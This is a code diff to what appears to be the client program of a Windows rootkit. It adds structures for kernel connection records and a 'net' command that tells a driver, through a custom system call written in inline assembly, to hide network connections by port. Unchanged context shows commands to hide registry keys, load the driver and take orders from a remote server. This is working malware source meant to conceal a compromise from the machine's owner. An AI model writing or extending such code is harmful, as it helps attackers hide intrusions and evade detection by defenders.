@@ -14,6 +14,42 @@
 
 #define SERVER_PORT	9999
 
+#define HTONS(a)  (((0xFF&a)<<8) + ((0xFF00&a)>>8))
+
+typedef struct _CONNINFO101 {
+	unsigned long status;
+	unsigned long src_addr;
+	unsigned short src_port;
+	unsigned short unk1;
+	unsigned long dst_addr;
+	unsigned short dst_port;
+	unsigned short unk2;
+} CONNINFO101, * PCONNINFO101;
+
+typedef struct _CONNINFO102 {
+	unsigned long status;
+	unsigned long src_addr;
+	unsigned short src_port;
+	unsigned short unk1;
+	unsigned long dst_addr;
+	unsigned short dst_port;
+	unsigned short unk2;
+	unsigned long pid;
+} CONNINFO102, * PCONNINFO102;
+
+typedef struct _CONNINFO110 {
+	unsigned long size;
+	unsigned long status;
+	unsigned long src_addr;
+	unsigned short src_port;
+	unsigned short unk1;
+	unsigned long dst_addr;
+	unsigned short dst_port;
+	unsigned short unk2;
+	unsigned long pid;
+	PVOID    unk3[35];
+} CONNINFO110, * PCONNINFO110;
+
 SOCKET sserver;
 
 unsigned int AddressSystemCall;
@@ -31,7 +67,7 @@ __declspec(naked) void SysCall(void) {
 int InitSocket();
 int ConnectToServer();
 unsigned char* RecvCommand();
-int RecvMove(unsigned char* buffer, unsigned int* len);
+int RecvMove(unsigned char* buffer, int* len);
 void SendOK();
 
 int main(int argc, char* argv[]) {
@@ -42,7 +78,7 @@ int main(int argc, char* argv[]) {
 		memset(&cmd, 0, sizeof(COMMAND));
 
 		// START CLIENT
-		if (!strcmp(argv[1], "serv")) {
+		if (!strcmp(argv[1], "server")) {
 			unsigned char* commandBuffer;
 			if (!InitSocket()) {
 				return 1;
@@ -57,7 +93,7 @@ int main(int argc, char* argv[]) {
 
 				commandBuffer = RecvCommand();
 				cmd = (PCOMMAND)commandBuffer;
-				printf("Command %08X %08X %08X\n", cmd->flags, cmd->target, cmd->change);
+				printf("Command %08X %08X %08X\n", (unsigned int)cmd->flags, (unsigned int)cmd->target, (unsigned int)cmd->change);
 			}
 		}
 		// TEST SYSCALL
@@ -65,7 +101,6 @@ int main(int argc, char* argv[]) {
 			cmd.flags = COMMAND_TEST_COMMAND;
 			cmd.target = NULL;
 			cmd.change = NULL;
-			unsigned int cc = (unsigned int)NULL;
 			__asm {
 				push 0
 				push 0
@@ -175,6 +210,29 @@ int main(int argc, char* argv[]) {
 			}
 			else printf("Error hide add key\n");
 		}
+		// ADD NET
+		else if (!strcmp(argv[1], "net")) {
+			if (argc > 1) {
+				if (!strcmp(argv[2], "dst")) {
+					cmd.flags = COMMAND_HIDE_NET | COMMAND_BUFFER_DST_PORT;
+				}
+				else if (!strcmp(argv[2], "src")) {
+					cmd.flags = COMMAND_HIDE_NET | COMMAND_BUFFER_SRC_PORT;
+				}
+				cmd.target = (void*)strtoul(argv[3], NULL, 0);
+				cmd.change = NULL;
+				__asm {
+					push 0
+					push 0
+					lea eax, cmd
+					push eax
+					push SIGNATURE_SYSCALL
+					mov eax, 0x26
+				}
+				AddressSystemCall = (unsigned int)FastSystemCall;
+				SysCall();
+			}
+		}
 		// START DRIVER
 		else if (!strcmp(argv[1], "start")) {
 			char buf[2 * MAX_PATH];
@@ -258,7 +316,7 @@ unsigned char* RecvCommand() {
 	return cmd;
 }
 
-int RecvMove(unsigned char* buffer, unsigned int* len) {
+int RecvMove(unsigned char* buffer, int* len) {
 	int total = 0;
 	int bytesleft = *len;
 	int n = -1;
